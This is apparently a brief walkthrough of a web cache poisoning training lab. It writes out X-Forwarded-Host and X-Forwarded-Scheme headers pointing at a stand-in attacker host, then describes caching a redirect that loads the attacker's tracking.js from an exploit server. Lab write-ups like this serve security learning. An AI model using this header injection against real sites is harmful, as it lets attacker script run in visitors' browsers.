
---

1. Access the root of the app, and insert the following headers

```
X-Forwarded-Host: rodnt.evil.com
X-Forwarded-Scheme: http
```

![](/static/img/Pasted_image_20231115182559.png)

2. Verify that the app, will redirect.
3. Now setup the exploit lab with the following content:

![](/static/img/Pasted_image_20231115183247.png)
4. Exploit again, now with the exploit of the url lab

![](/static/img/Pasted_image_20231115183326.png)

5. Remove the cache burst key, and resend the request until you get the exploit working

> add the following path to your exploit server /resources/js/tracking.js

![](/static/img/Pasted_image_20231115184941.png)


![](/static/img/Pasted_image_20231115184912.png)


